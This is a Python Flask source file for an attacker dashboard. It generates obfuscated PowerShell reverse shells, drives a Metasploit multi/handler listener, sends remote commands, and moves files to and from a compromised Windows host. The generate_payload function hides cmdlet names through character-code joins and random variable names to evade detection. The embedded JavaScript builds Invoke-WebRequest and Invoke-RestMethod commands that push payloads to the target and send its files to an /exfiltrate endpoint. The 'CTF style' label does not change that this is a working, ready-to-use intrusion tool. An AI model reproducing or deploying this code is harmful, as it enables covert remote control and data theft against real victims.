#!/usr/bin/env python3
"""
Flask GUI for Metasploit multi/handler + obfuscated PowerShell payload generator.
Aggressive red neon design – CTF style, fully interactive.
"""

import subprocess
import signal
import os
import time
import random
import string
import threading
import re
import tempfile
from collections import deque
from flask import Flask, request, jsonify, render_template_string, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)

# ─────────────────────────────────────────────────────────────────
#  Metasploit listener globals
# ─────────────────────────────────────────────────────────────────
msf_process = None
msf_master_fd = None

UPLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'uploads')
DOWNLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'downloads')
os.makedirs(UPLOADS_DIR, exist_ok=True)
os.makedirs(DOWNLOADS_DIR, exist_ok=True)

listener_status = {
    "running": False,
    "lhost": "0.0.0.0",
    "lport": 0,
    "payload": "generic/shell_reverse_tcp"
}

# Console output buffer (last 500 lines)
console_output = deque(maxlen=500)
console_lock = threading.Lock()

def strip_ansi(text):
    """Remove ANSI color codes from msfconsole output."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def read_msf_output():
    """Read msfconsole output in a background thread."""
    global msf_process
    if not msf_process:
        return
    try:
        for line in iter(msf_process.stdout.readline, ''):
            if line:
                clean_line = strip_ansi(line.rstrip())
                with console_lock:
                    console_output.append(clean_line)
    except:
        pass

# ----------------------------------------------------------------------
#  Obfuscated payload generator helpers (FIXED SYNTAX)
# ----------------------------------------------------------------------

def obf_char(ascii_code: int) -> str:
    """Return a small obfuscated expression that evaluates to the given ASCII code."""
    offset = random.randint(0, 50)
    return f"[char]({offset}+{ascii_code - offset})"

def obf_string_via_join(s: str) -> str:
    """Generate obfuscated expression that builds a string from ASCII codes."""
    codes = [ord(c) for c in s]
    code_list = ",".join(str(c) for c in codes)
    return f'([string]::join(\'\', ( ({code_list}) |%{{$_}}|ForEach-Object{{$_}}|%{{ ( [char][int] $_)}})) |%{{$_}}|ForEach-Object{{$_}}| % {{$_}})'

def random_var(length=8) -> str:
    """Generate a random variable name like $aBcDeFgH"""
    first = random.choice(string.ascii_letters)
    rest = ''.join(random.choices(string.ascii_letters + string.digits, k=length-1))
    return f"${first}{rest}"

def generate_payload(ip: str, port: int) -> str:
    """Create heavily obfuscated PowerShell reverse shell with correct syntax."""
    
    # Strings to obfuscate
    str_new_object = "New-Object"
    str_tcpclient = "System.Net.Sockets.TCPClient"
    str_asciienc  = "System.Text.ASCIIEncoding"
    str_iex       = "Invoke-Expression"
    str_out_string = "Out-String"
    str_get_loc    = "Get-Location"

    # Build obfuscated expressions
    obf_new_object = obf_string_via_join(str_new_object)
    obf_tcpclient  = obf_string_via_join(str_tcpclient)
    obf_asciienc   = obf_string_via_join(str_asciienc)
    obf_iex        = obf_string_via_join(str_iex)
    obf_out_string = obf_string_via_join(str_out_string)
    obf_get_loc    = obf_string_via_join(str_get_loc)

    # Obfuscate IP and port as strings
    def obf_string_as_args(s: str) -> str:
        """Build obfuscated string like $([char]... + [char]... + ...)"""
        parts = []
        for ch in s:
            parts.append(obf_char(ord(ch)))
        return '$(' + '+'.join(parts) + ')'

    obf_ip   = obf_string_as_args(ip)
    obf_port = obf_string_as_args(str(port))

    # Random variables
    var_client = random_var(12)
    var_stream = random_var(10)
    var_buf    = random_var(8)
    var_read   = random_var(8)
    var_data   = random_var(8)
    var_result = random_var(8)
    var_prompt = random_var(8)
    var_send   = random_var(6)

    # FIXED: correct PowerShell variable syntax, no triple braces
    payload = f"""\
{var_client} = & {obf_new_object} {obf_tcpclient}({obf_ip}, {obf_port});
{var_stream} = {var_client}.GetStream();
[byte[]]{var_buf} = 0..65535|%{{$_}}|%{{0}};
while(({var_read} = {var_stream}.Read({var_buf}, 0, {var_buf}.Length)) -ne 0){{
    {var_data} = (& {obf_new_object} -TypeName {obf_asciienc}).GetString({var_buf},0, {var_read});
    {var_result} = (& {obf_iex} {var_data} 2>&1 |%{{$_}}| & {obf_out_string} );
    {var_prompt} = {var_result} + 'PS ' + (& {obf_get_loc}).Path + '> ';
    {var_send} = ([text.encoding]::ASCII).GetBytes({var_prompt});
    {var_stream}.Write({var_send},0,{var_send}.Length);
    {var_stream}.Flush();
}};
{var_client}.Close();
""".rstrip()

    return payload

# ----------------------------------------------------------------------
#  Flask routes
# ----------------------------------------------------------------------

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>NEO-HANDLER | V2.0</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500;800&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
<style>
  :root {
    --neon-red: #ff003c;
    --neon-glow: rgba(255, 0, 60, 0.4);
    --bg-dark: #050506;
    --panel-bg: rgba(15, 15, 20, 0.85);
    --border-color: rgba(255, 0, 60, 0.3);
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background-color: var(--bg-dark);
    background-image: 
      linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%),
      linear-gradient(90deg, rgba(255, 0, 0, 0.05), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.05));
    background-size: 100% 4px, 3px 100%;
    color: #e0e0e0;
    font-family: 'JetBrains Mono', monospace;
    height: 100vh;
    overflow: hidden;
  }

  /* Animated Hex Grid Background */
  .grid-bg {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iMTA0IiB2aWV3Qm94PSIwIDAgNjAgMTA0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik02MCAxMDRWODZMNzAgODBMNjAgNzRWMzZMNzAgMzBMNjAgMjRWMGgtMnYyNEw0OCAzMGwxMCA2djM4bC0xMCA2IDEwIDZ2MThoMnptLTIgODRMMzggOTRMNTAgODhsMTAgNnYxMnoiIGZpbGw9IiNmZjAwM2MiIGZpbGwtb3BhY2l0eT0iMC4wNSIvPjwvc3ZnPg==');
    z-index: -1;
    animation: backgroundScroll 60s linear infinite;
  }

  @keyframes backgroundScroll {
    from { background-position: 0 0; }
    to { background-position: 0 1000px; }
  }

  #app {
    display: grid;
    grid-template-areas: 
      "header header"
      "sidebar main"
      "footer footer";
    grid-template-columns: 350px 1fr;
    grid-template-rows: 70px 1fr 40px;
    height: 100vh;
    gap: 15px;
    padding: 15px;
  }

  header {
    grid-area: header;
    background: var(--panel-bg);
    border: 1px solid var(--border-color);
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0 30px;
    box-shadow: 0 0 20px rgba(0,0,0,0.5);
    clip-path: polygon(0 0, 100% 0, 98% 100%, 2% 100%);
  }

  .logo {
    font-family: 'Orbitron';
    font-weight: 900;
    font-size: 24px;
    letter-spacing: 5px;
    color: var(--neon-red);
    text-shadow: 0 0 10px var(--neon-red);
    animation: glitch 3s infinite;
  }

  @keyframes glitch {
    0% { transform: skew(0deg); }
    1% { transform: skew(10deg); opacity: 0.5; }
    2% { transform: skew(-10deg); opacity: 1; }
    3% { transform: skew(0deg); }
  }

  /* Layout Containers */
  .sidebar { grid-area: sidebar; display: flex; flex-direction: column; gap: 15px; overflow-y: auto; }
  .main-content { grid-area: main; display: flex; flex-direction: column; gap: 15px; overflow-y: auto; }

  .pane {
    background: var(--panel-bg);
    border: 1px solid var(--border-color);
    border-top: 3px solid var(--neon-red);
    padding: 20px;
    position: relative;
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  }

  .pane:hover {
    box-shadow: 0 0 25px rgba(255, 0, 60, 0.15);
    border-color: var(--neon-red);
  }

  .pane-title {
    font-family: 'Orbitron';
    font-size: 11px;
    text-transform: uppercase;
    color: #ff7e9d;
    margin-bottom: 15px;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .pane-title::after {
    content: ""; flex: 1; height: 1px; background: linear-gradient(90deg, var(--border-color), transparent);
  }

  /* Realistic Inputs */
  input, textarea {
    width: 100%;
    background: rgba(0, 0, 0, 0.5);
    border: 1px solid #333;
    color: #00ff41; /* Classic Matrix Green for code/input */
    padding: 10px;
    font-family: 'JetBrains Mono';
    margin-bottom: 10px;
    border-radius: 4px;
    outline: none;
    transition: 0.2s;
  }

  input:focus { border-color: var(--neon-red); box-shadow: 0 0 8px var(--neon-glow); }

  /* CTF Style Buttons */
  .btn-group { display: flex; gap: 10px; }
  .btn {
    padding: 12px;
    border: 1px solid var(--neon-red);
    background: rgba(255, 0, 60, 0.05);
    color: var(--neon-red);
    cursor: pointer;
    font-family: 'Orbitron';
    font-size: 10px;
    font-weight: bold;
    text-transform: uppercase;
    transition: 0.2s;
    position: relative;
    overflow: hidden;
    flex: 1;
  }

  .btn::before {
    content: ""; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
    transition: 0.4s;
  }

  .btn:hover::before { left: 100%; }
  .btn:hover { background: var(--neon-red); color: white; box-shadow: 0 0 15px var(--neon-red); }
  .btn:active { transform: translateY(2px); }
  .btn:disabled { opacity: 0.3; cursor: not-allowed; filter: grayscale(1); }

  /* Terminal Styling */
  .terminal {
    background: #000;
    border: 1px solid #222;
    height: 100%;
    min-height: 300px;
    padding: 15px;
    overflow-y: auto;
    font-size: 13px;
    line-height: 1.5;
    color: #ff4d4d;
    position: relative;
    box-shadow: inset 0 0 30px rgba(255,0,0,0.1);
  }

  .terminal::after {
    content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    background: linear-gradient(transparent 50%, rgba(0,0,0,0.1) 50%);
    background-size: 100% 4px; pointer-events: none;
  }

  .status-tag {
    padding: 2px 10px;
    border-radius: 10px;
    font-size: 10px;
    font-weight: bold;
    border: 1px solid;
  }

  .online { color: #00ff41; border-color: #00ff41; background: rgba(0,255,65,0.1); box-shadow: 0 0 10px rgba(0,255,65,0.2); }
  .offline { color: #ff003c; border-color: #ff003c; background: rgba(255,0,60,0.1); }

  ::-webkit-scrollbar { width: 4px; }
  ::-webkit-scrollbar-thumb { background: var(--neon-red); }
</style>
</head>
<body>
  <div class="grid-bg"></div>
  <div id="app">
    <header>
      <div class="logo">NEO-HANDLER_V2</div>
      <div id="connection-status" class="status-tag offline">SYSTEM OFFLINE</div>
    </header>

    <div class="sidebar">
      <div class="pane">
        <div class="pane-title">Connection Parameters</div>
        <label style="font-size: 9px; color: #888;">LHOST</label>
        <input id="lhost" type="text" value="0.0.0.0"/>
        <label style="font-size: 9px; color: #888;">LPORT</label>
        <input id="port" type="number" value="4444"/>
        <div class="btn-group">
          <button class="btn" id="btn-generate">Gen Payload</button>
          <button class="btn" id="btn-start">Listen</button>
        </div>
        <button class="btn" id="btn-stop" disabled style="width:100%; margin-top:10px; border-color:#555; color:#888;">Kill Process</button>
      </div>

      <div class="pane" style="flex:1; display:flex; flex-direction:column;">
        <div class="pane-title">Exfiltrated Data</div>
        <div id="downloads-list" style="flex:1; font-size:11px; overflow-y:auto; margin-bottom:8px;"></div>
        <button class="btn" id="btn-refresh-dl" style="width:100%; margin-top:10px;">Sync Storage</button>
      </div>
    </div>

    <div class="main-content">
      <div class="pane" style="height: 40%;">
        <div class="pane-title" style="justify-content:space-between;">
          <span>Obfuscated Vectors</span>
          <button id="btn-copy" style="background:none; border:none; color:var(--neon-red); cursor:pointer; font-size:10px;">[COPY TO CLIPBOARD]</button>
        </div>
        <textarea id="payload-out" style="height: calc(100% - 40px); color: #00ff41;" readonly placeholder="Awaiting payload generation..."></textarea>
      </div>

      <div class="pane" style="flex:1; display:flex; flex-direction:column;">
        <div class="pane-title">Remote Shell Access</div>
        <div class="terminal" id="console">Initializing system kernels...</div>
        <div style="display:flex; gap:10px; margin-top:10px;">
          <input id="shell-input" type="text" placeholder="execute_remote_command >" style="margin-bottom:0; flex:1;"/>
          <button class="btn" id="btn-send-cmd" style="flex:0 0 100px;">Send</button>
        </div>
      </div>
      
      <div class="pane">
        <div class="pane-title">File Transfer Protocol</div>
        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
          <div>
            <input type="file" id="upload-file" style="font-size:10px; background:transparent; border:none; padding:0;"/>
            <button class="btn" id="btn-upload" style="width:100%;">Upload to Target</button>
          </div>
          <div>
            <input type="text" id="download-path" placeholder="C:\\Remote\\Path\\file.txt" style="font-size:10px;"/>
            <button class="btn" id="btn-download" style="width:100%;">Pull from Target</button>
          </div>
        </div>
      </div>
    </div>

    <footer style="grid-area: footer; font-size: 9px; display:flex; align-items:center; justify-content:center; color:#444; border-top:1px solid #111;">
      ENCRYPTED CHANNEL SECURED // 256-BIT // SESSION ID: <span id="session-id" style="margin-left:5px; color:#666;"></span>
    </footer>
  </div>

<script>
  const $ = s => document.querySelector(s);
  let logOffset = 0;
  
  // Set random session ID
  $('#session-id').innerText = Math.random().toString(16).substr(2, 12).toUpperCase();

  function log(msg) {
    const c = $('#console');
    const line = document.createElement('div');
    line.innerHTML = `<span style="color:#666;">[${new Date().toLocaleTimeString()}]</span> <span style="color:white;">$</span> ${msg}`;
    c.appendChild(line);
    c.scrollTop = c.scrollHeight;
  }

  async function pollLogs() {
    try {
      const resp = await fetch(`/listener/logs?offset=${logOffset}`);
      const data = await resp.json();
      if(data.logs && data.logs.length) {
        data.logs.forEach(line => log(line));
        logOffset += data.logs.length;
      }
      if($('#connection-status').classList.contains('online')) {
        setTimeout(pollLogs, 1200);
      }
    } catch(e) {}
  }

  $('#btn-generate').onclick = async () => {
    const lhost = $('#lhost').value || '0.0.0.0';
    const port = $('#port').value;
    log(`Encrypting payload for ${lhost}:${port}...`);
    const resp = await fetch('/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: lhost, port: parseInt(port) })
      });
    const data = await resp.json();
    if(data.payload) {
      $('#payload-out').value = data.payload;
      log("Payload ready. Vector obfuscated.");
    }
  };

  $('#btn-start').onclick = async () => {
    const lhost = $('#lhost').value || '0.0.0.0';
    const port = $('#port').value;
    $('#btn-start').disabled = true;
    log(`Waking Metasploit daemon on port ${port}...`);
    
    const resp = await fetch('/listener/start', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ lhost: lhost, lport: parseInt(port) })
    });
    const data = await resp.json();
    if(data.success) {
      $('#connection-status').innerText = "SYSTEM ACTIVE";
      $('#connection-status').className = "status-tag online";
      $('#btn-stop').disabled = false;
      pollLogs();
    }
  };

  $('#btn-stop').onclick = async () => {
    await fetch('/listener/stop', { method: 'POST' });
    location.reload();
  };

  $('#btn-send-cmd').onclick = async () => {
    const cmd = $('#shell-input').value;
    if(!cmd) return;
    await fetch('/listener/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd })
    });
    $('#shell-input').value = '';
  };

  $('#btn-copy').onclick = () => {
    $('#payload-out').select();
    document.execCommand('copy');
    log("Payload copied to clipboard.");
  };

  // Upload to target
  $('#btn-upload').addEventListener('click', async () => {
    const fileInput = $('#upload-file');
    if(!fileInput.files.length) return log("[-] No file selected");
    const file = fileInput.files[0];
    const formData = new FormData();
    formData.append('file', file);
    log(`[*] Uploading ${file.name} to Flask server...`);
    try {
      const resp = await fetch('/upload_to_flask', { method: 'POST', body: formData });
      const data = await resp.json();
      if(data.success) {
        log(`[+] File saved on Flask as ${data.filename}`);
        const flaskIp = window.location.hostname;
        const flaskPort = window.location.port;
        const url = `http://${flaskIp}:${flaskPort}/uploads/${data.filename}`;
        const psCmd = `Invoke-WebRequest -Uri "${url}" -OutFile "${data.filename}"`;
        log(`[*] Sending command to target: ${psCmd}`);
        await fetch('/listener/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command: psCmd })
        });
        log(`[+] Upload command sent.`);
        fileInput.value = '';
      } else {
        log(`[-] Upload failed: ${data.error}`);
      }
    } catch(e) { log(`[-] Upload error: ${e.message}`); }
  });

  // Download from target
  $('#btn-download').addEventListener('click', async () => {
    const remotePath = $('#download-path').value.trim();
    if(!remotePath) return log("[-] No remote path provided");
    const filename = remotePath.split('\\\\').pop().split('/').pop();
    const flaskIp = window.location.hostname;
    const flaskPort = window.location.port;
    const url = `http://${flaskIp}:${flaskPort}/exfiltrate?filename=${filename}`;
    const psCmd = `Invoke-RestMethod -Uri "${url}" -Method Post -InFile "${remotePath}"`;
    log(`[*] Sending command to target: ${psCmd}`);
    try {
      await fetch('/listener/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: psCmd })
      });
      log(`[+] Download command sent. Wait a moment and refresh local downloads.`);
      $('#download-path').value = '';
    } catch(e) { log(`[-] Download error: ${e.message}`); }
  });

  // Refresh downloads
  async function refreshDownloads() {
    try {
      const resp = await fetch('/downloads_list');
      const data = await resp.json();
      const list = $('#downloads-list');
      list.innerHTML = '';
      if(data.files && data.files.length) {
        data.files.forEach(f => {
          const a = document.createElement('a');
          a.href = `/downloads/${f}`;
          a.innerText = f;
          a.target = '_blank';
          a.download = f;
          a.style.color = '#ff4444';
          a.style.display = 'block';
          a.style.marginBottom = '4px';
          list.appendChild(a);
        });
      } else {
        list.innerText = 'No files downloaded yet.';
      }
    } catch(e) {}
  }
  $('#btn-refresh-dl').addEventListener('click', refreshDownloads);
  refreshDownloads();
  
  // Enter key for shell
  $('#shell-input').addEventListener('keypress', (e) => {
    if(e.key === 'Enter') $('#btn-send-cmd').click();
  });

  // initial status fetch
  window.onload = async () => {
    try {
      const r = await fetch('/listener/status');
      const d = await r.json();
      if(d.running) {
        $('#connection-status').innerText = 'SYSTEM ACTIVE';
        $('#connection-status').className = 'status-tag online';
        $('#btn-start').disabled = true;
        $('#btn-stop').disabled = false;
        pollLogs();
      }
    } catch(e) {}
  };
</script>
</body>
</html>

"""

# ----------------------------------------------------------------------
#  Routes
# ----------------------------------------------------------------------

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/generate', methods=['POST'])
def generate():
    data = request.get_json()
    ip = data.get('ip', '').strip()
    try:
        port = int(data.get('port', 0))
    except (ValueError, TypeError):
        return jsonify({"error": "Invalid port"}), 400
    if not ip or not (1 <= port <= 65535):
        return jsonify({"error": "IP and valid port required"}), 400
    payload = generate_payload(ip, port)
    return jsonify({"payload": payload})

@app.route('/listener/start', methods=['POST'])
def start_listener():
    global msf_process, listener_status
    if listener_status["running"]:
        return jsonify({"success": False, "error": "Already running"})
    data = request.get_json()
    lhost = data.get('lhost', '0.0.0.0').strip()
    port = data.get('lport')
    if not port:
        return jsonify({"success": False, "error": "Port required"})
    try:
        port = int(port)
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        return jsonify({"success": False, "error": "Invalid port"})

    payload = "generic/shell_reverse_tcp"
    
    # Resource script – exactly as manual: use multi/handler, set options, exploit -j, keep alive
    resource_script = f"""
use multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {port}
set ExitOnSession false
exploit -j
"""
    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write(resource_script)
            rc_file = f.name
        
        import pty
        master, slave = pty.openpty()
        global msf_master_fd
        msf_master_fd = master
        msf_process = subprocess.Popen(
            ["msfconsole", "-q", "-r", rc_file],
            stdin=slave,
            stdout=slave,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            close_fds=True
        )
        os.close(slave)
        
        def read_msf_pty(fd):
            with os.fdopen(fd, 'r') as f:
                for line in iter(f.readline, ''):
                    if line:
                        clean_line = strip_ansi(line.rstrip())
                        with console_lock:
                            console_output.append(clean_line)

        threading.Thread(target=read_msf_pty, args=(master,), daemon=True).start()
        time.sleep(2)
        if msf_process.poll() is not None:
            raise RuntimeError("msfconsole exited unexpectedly")
        
        listener_status["running"] = True
        listener_status["lhost"] = lhost
        listener_status["lport"] = port
        listener_status["payload"] = payload
        
        with console_lock:
            console_output.append(f"[+] multi/handler started on {lhost}:{port}")
        return jsonify({"success": True, "lhost": lhost, "lport": port, "payload": payload})
    except Exception as e:
        msf_process = None
        return jsonify({"success": False, "error": str(e)})

@app.route('/listener/stop', methods=['POST'])
def stop_listener():
    global msf_process, listener_status, msf_master_fd
    if not listener_status["running"]:
        return jsonify({"success": False, "error": "Not running"})
    if msf_process and msf_process.poll() is None:
        try:
            msf_process.send_signal(signal.SIGINT)
            msf_process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            msf_process.kill()
    msf_process = None
    if msf_master_fd is not None:
        try: os.close(msf_master_fd)
        except: pass
        msf_master_fd = None
    listener_status["running"] = False
    with console_lock:
        console_output.append("[*] Handler stopped")
    return jsonify({"success": True, "message": "Listener stopped"})

@app.route('/listener/status')
def listener_status_route():
    return jsonify(listener_status)

@app.route('/listener/logs')
def listener_logs():
    offset = int(request.args.get('offset', 0))
    with console_lock:
        logs = list(console_output)[offset:]
    return jsonify({"logs": logs})

@app.route('/listener/send', methods=['POST'])
def listener_send():
    global msf_master_fd, msf_process
    if not listener_status["running"] or msf_master_fd is None:
        return jsonify({"success": False, "error": "Not running"})
    data = request.get_json()
    cmd = data.get('command', '')
    try:
        os.write(msf_master_fd, (cmd + '\n').encode())
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/upload_to_flask', methods=['POST'])
def upload_to_flask():
    if 'file' not in request.files:
        return jsonify({"success": False, "error": "No file provided"})
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "error": "No file selected"})
    filename = secure_filename(file.filename)
    file.save(os.path.join(UPLOADS_DIR, filename))
    return jsonify({"success": True, "filename": filename})

@app.route('/uploads/<filename>')
def serve_upload(filename):
    return send_from_directory(UPLOADS_DIR, filename)

@app.route('/exfiltrate', methods=['POST'])
def exfiltrate():
    # Receive file from target
    if 'file' in request.files:
        file = request.files['file']
        filename = secure_filename(file.filename)
        file.save(os.path.join(DOWNLOADS_DIR, filename))
        return "OK"
    elif request.data:
        # Sometimes Invoke-RestMethod just posts raw body
        filename = secure_filename(request.args.get('filename', f"exfil_{int(time.time())}.bin"))
        with open(os.path.join(DOWNLOADS_DIR, filename), 'wb') as f:
            f.write(request.data)
        return "OK"
    else:
        return "No data", 400

@app.route('/downloads_list')
def list_downloads():
    files = os.listdir(DOWNLOADS_DIR)
    return jsonify({"files": files})

@app.route('/downloads/<filename>')
def serve_download(filename):
    return send_from_directory(DOWNLOADS_DIR, filename)

def cleanup():
    global msf_process, msf_master_fd
    if msf_process and msf_process.poll() is None:
        msf_process.send_signal(signal.SIGINT)
        try:
            msf_process.wait(timeout=3)
        except:
            msf_process.kill()
    if msf_master_fd is not None:
        try: os.close(msf_master_fd)
        except: pass

if __name__ == '__main__':
    try:
        app.run(host='0.0.0.0', port=5000, debug=False)
    finally:
        cleanup()